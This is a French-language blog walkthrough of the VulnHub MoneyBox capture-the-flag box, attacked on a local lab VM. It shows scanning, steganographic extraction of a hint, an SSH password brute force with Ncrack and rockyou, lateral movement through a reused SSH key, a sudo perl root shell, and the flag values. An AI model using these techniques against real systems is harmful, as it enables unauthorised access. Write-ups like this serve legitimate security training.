---
title: Solution du CTF MoneyBox de VulnHub
tags: [CTF, VulnHub]
---

### Internet Of Cats

La légende veut que j'ai résolu tous les CTFs de VulnHub. Mais ce n'est pas le cas 😆

La preuve en est avec ce CTF intitulé [MoneyBox](https://vulnhub.com/entry/moneybox-1,653/).

Ce CTF démarre assez mal avec de la stégano. Mais, depuis que je connais [stegoVeritas: Yet another Stego Tool](https://github.com/bannsec/stegoVeritas), plus besoin de perdre des heures à résoudre des erreurs de compilation impossibles sur du code des années 90.

```console
$ sudo nmap -sCV -p- -T5 --script vuln 192.168.56.111
Starting Nmap 7.95 ( https://nmap.org )
Nmap scan report for 192.168.56.111
Host is up (0.00090s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| vulners: 
|   vsftpd 3.0.3: 
|       CVE-2021-30047  7.5     https://vulners.com/cve/CVE-2021-30047
|_      CVE-2021-3618   7.4     https://vulners.com/cve/CVE-2021-3618
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| vulners: 
|   cpe:/a:openbsd:openssh:7.9p1: 
|       5E6968B4-DBD6-57FA-BF6E-D9B2219DB27A    10.0    https://vulners.com/githubexploit/5E6968B4-DBD6-57FA-BF6E-D9B2219DB27A  *EXPLOIT*
|       F0979183-AE88-53B4-86CF-3AF0523F3807    9.8     https://vulners.com/githubexploit/F0979183-AE88-53B4-86CF-3AF0523F3807  *EXPLOIT*
|       CVE-2023-38408  9.8     https://vulners.com/cve/CVE-2023-38408
--- snip ---
|       CVE-2025-32728  4.3     https://vulners.com/cve/CVE-2025-32728
|       CVE-2021-36368  3.7     https://vulners.com/cve/CVE-2021-36368
|       PACKETSTORM:151227      0.0     https://vulners.com/packetstorm/PACKETSTORM:151227      *EXPLOIT*
|_      PACKETSTORM:140261      0.0     https://vulners.com/packetstorm/PACKETSTORM:140261      *EXPLOIT*
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-server-header: Apache/2.4.38 (Debian)
|_http-dombased-xss: Couldn't find any DOM based XSS.
| vulners: 
|   cpe:/a:apache:http_server:2.4.38: 
|       C94CBDE1-4CC5-5C06-9D18-23CAB216705E    10.0    https://vulners.com/githubexploit/C94CBDE1-4CC5-5C06-9D18-23CAB216705E  *EXPLOIT*
|       95499236-C9FE-56A6-9D7D-E943A24B633A    10.0    https://vulners.com/githubexploit/95499236-C9FE-56A6-9D7D-E943A24B633A  *EXPLOIT*
|       2C119FFA-ECE0-5E14-A4A4-354A2C38071A    10.0    https://vulners.com/githubexploit/2C119FFA-ECE0-5E14-A4A4-354A2C38071A  *EXPLOIT*
|       PACKETSTORM:181114      9.8     https://vulners.com/packetstorm/PACKETSTORM:181114      *EXPLOIT*
|       MSF:EXPLOIT-MULTI-HTTP-APACHE_NORMALIZE_PATH_RCE-       9.8     https://vulners.com/metasploit/MSF:EXPLOIT-MULTI-HTTP-APACHE_NORMALIZE_PATH_RCE-        *EXPLOIT*
|       MSF:AUXILIARY-SCANNER-HTTP-APACHE_NORMALIZE_PATH-       9.8     https://vulners.com/metasploit/MSF:AUXILIARY-SCANNER-HTTP-APACHE_NORMALIZE_PATH-        *EXPLOIT*
|       HTTPD:C072933AA965A86DA3E2C9172FFC1569  9.8     https://vulners.com/httpd/HTTPD:C072933AA965A86DA3E2C9172FFC1569
--- snip ---
|       B8198D62-F9C8-5E03-A301-9A3580070B4C    4.3     https://vulners.com/githubexploit/B8198D62-F9C8-5E03-A301-9A3580070B4C  *EXPLOIT*
|       1337DAY-ID-36854        4.3     https://vulners.com/zdt/1337DAY-ID-36854        *EXPLOIT*
|       1337DAY-ID-33575        4.3     https://vulners.com/zdt/1337DAY-ID-33575        *EXPLOIT*
|       PACKETSTORM:164501      0.0     https://vulners.com/packetstorm/PACKETSTORM:164501      *EXPLOIT*
|       PACKETSTORM:164418      0.0     https://vulners.com/packetstorm/PACKETSTORM:164418      *EXPLOIT*
|       PACKETSTORM:152441      0.0     https://vulners.com/packetstorm/PACKETSTORM:152441      *EXPLOIT*
|_      05403438-4985-5E78-A702-784E03F724D4    0.0     https://vulners.com/githubexploit/05403438-4985-5E78-A702-784E03F724D4  *EXPLOIT*
MAC Address: 08:00:27:3A:8F:5A (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 41.79 seconds
```

Je vous fais grâce de la quantité gigantesque de CVEs remontés pour le serveur Apache, cette version date de début 2019.

Sur le FTP, qui accepte les connexions anonymes, on trouve une grosse image JPG avec un chat qui joue les hackers. Ça sent fort la stéganographie.

Sur le serveur web, j'ai lancé Wapiti qui a trouvé un dossier `blogs` avec le module `buster` :

```console
$ wapiti -u http://192.168.56.111/ -m all --color

     __      __               .__  __  .__________
    /  \    /  \_____  ______ |__|/  |_|__\_____  \
    \   \/\/   /\__  \ \____ \|  \   __\  | _(__  <
     \        /  / __ \|  |_> >  ||  | |  |/       \
      \__/\  /  (____  /   __/|__||__| |__/______  /
           \/        \/|__|                      \/
Wapiti 3.2.4 (wapiti-scanner.github.io)
[*] Be careful! New moon tonight.
[*] Saving scan state, please wait...

--- snip ---

[*] Launching module buster
Found webpage http://192.168.56.111/index.html
Found webpage http://192.168.56.111/blogs/
Found webpage http://192.168.56.111/blogs/index.html
```

Dans le code HTML, on trouve une référence à un dossier :

```html
<html>
<head><title>MoneyBox</title></head>
<body>
    <h1>I'm T0m-H4ck3r</h1><br>
        <p>I Already Hacked This Box and Informed.But They didn't Do any Security configuration</p>
        <p>If You Want Hint For Next Step......?<p>
</body>
</html>

--- snip ---

<!--the hint is the another secret directory is S3cr3t-T3xt-->
```

Ce dossier `S3cr3t-T3xt` présent à la racine, contient un autre commentaire HTML avec un mot de passe :

```html
<!..Secret Key 3xtr4ctd4t4 >
```

Pas de nom d'utilisateur, un mot de passe, une image... C'est l'heure de `stegoveritas` :

```console
$ docker run -v /tmp:/data -it --rm bannsec/stegoveritas
(stegoveritas_venv) stegoveritas@0c89221a657b:~$ steghide extract -sf /data/trytofind.jpg -p 3xtr4ctd4t4     
wrote extracted data to "data.txt".
(stegoveritas_venv) stegoveritas@0c89221a657b:~$ cat data.txt 
Hello.....  renu

      I tell you something Important.Your Password is too Week So Change Your Password
Don't Underestimate it.......
```

Bonne pioche !

### Passe-Partout

On s'empresse donc de brute forcer le compte `renu`, ici avec `Ncrack` :

```console
$ ncrack -v -u renu -P wordlists/rockyou.txt ssh://192.168.56.111

Starting Ncrack 0.8 ( http://ncrack.org )

Stats: 0:00:39 elapsed; 0 services completed (1 total)
Rate: 0.00; Found: 0; About 0.00% done
Discovered credentials on ssh://192.168.56.111:22 'renu' '987654321'
Stats: 0:00:51 elapsed; 0 services completed (1 total)
Rate: 0.00; Found: 1; About 0.00% done
(press 'p' to list discovered credentials)
```

On obtient le premier flag. L'utilisateur n'a pas de permissions `sudo` mais son historique bash n'est pas vide, ce qui est rare sur un CTF.

```console
$ ssh renu@192.168.56.111
renu@192.168.56.111's password: 
Linux MoneyBox 4.19.0-14-amd64 #1 SMP Debian 4.19.171-2 (2021-01-30) x86_64

Last login: Fri Feb 26 08:53:43 2021 from 192.168.43.44
renu@MoneyBox:~$ id
uid=1001(renu) gid=1001(renu) groups=1001(renu)
renu@MoneyBox:~$ sudo -l
[sudo] password for renu: 
Sorry, user renu may not run sudo on MoneyBox.
renu@MoneyBox:~$ ls -al
total 40
drwxr-xr-x 5 renu renu 4096 Feb 26  2021 .
drwxr-xr-x 4 root root 4096 Feb 26  2021 ..
-rw------- 1 renu renu  642 Feb 26  2021 .bash_history
-rw-r--r-- 1 renu renu  220 Apr 17  2019 .bash_logout
-rw-r--r-- 1 renu renu 3526 Apr 17  2019 .bashrc
drwxr-xr-x 3 root root 4096 Feb 26  2021 ftp
drwxr-xr-x 3 renu renu 4096 Feb 26  2021 .local
-rw-r--r-- 1 renu renu  807 Apr 17  2019 .profile
drwx------ 2 renu renu 4096 Feb 26  2021 .ssh
-rw-r--r-- 1 renu renu   64 Feb 26  2021 user1.txt
renu@MoneyBox:~$ cat user1.txt 
Yes...!
You Got it User1 Flag

 ==> us3r1{F14g:0ku74tbd3777y4}
```

Dans l'historique, on voit qu'il utilise sa clé SSH pour accèder au compte `lily`. Ce dernier existe sur le système :

```console
renu@MoneyBox:~$ cat .bash_history
cler
ls
--- snip ---
ssh-keygen -t rsa
clear
cd .ssh
ls
ssh-copy-id lily@192.168.43.80
clear
cd
cd -
ls -l
chmod 400 id_rsa
ls -l
ssh -i id_rsa lily@192.168.43.80
--- snip ---
renu@MoneyBox:~$ id lily
uid=1000(lily) gid=1000(lily) groups=1000(lily),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev)
renu@MoneyBox:~$ ssh lily@127.0.0.1
The authenticity of host '127.0.0.1 (127.0.0.1)' can't be established.
ECDSA key fingerprint is SHA256:8GzSoXjLv35yJ7cQf1EE0rFBb9kLK/K1hAjzK/IXk8I.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '127.0.0.1' (ECDSA) to the list of known hosts.
Linux MoneyBox 4.19.0-14-amd64 #1 SMP Debian 4.19.171-2 (2021-01-30) x86_64

Last login: Fri Feb 26 09:07:47 2021 from 192.168.43.80
lily@MoneyBox:~$ sudo -l
Matching Defaults entries for lily on MoneyBox:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User lily may run the following commands on MoneyBox:
    (ALL : ALL) NOPASSWD: /usr/bin/perl
```

Pour la finale, on est sur de la classique exécution par sudo :

```console
lily@MoneyBox:~$ sudo perl -e 'exec "/bin/sh";'
# id
uid=0(root) gid=0(root) groups=0(root)
# cd /root
# ls
# ls -al
total 28
drwx------  3 root root 4096 Feb 26  2021 .
drwxr-xr-x 18 root root 4096 Feb 25  2021 ..
-rw-------  1 root root 2097 Feb 26  2021 .bash_history
-rw-r--r--  1 root root  570 Jan 31  2010 .bashrc
drwxr-xr-x  3 root root 4096 Feb 25  2021 .local
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-rw-r--r--  1 root root  228 Feb 26  2021 .root.txt
# cat .root.txt

Congratulations.......!

You Successfully completed MoneyBox

Finally The Root Flag
    ==> r00t{H4ckth3p14n3t}

I'm Kirthik-KarvendhanT
    It's My First CTF Box
         
instagram : ____kirthik____

See You Back....
```
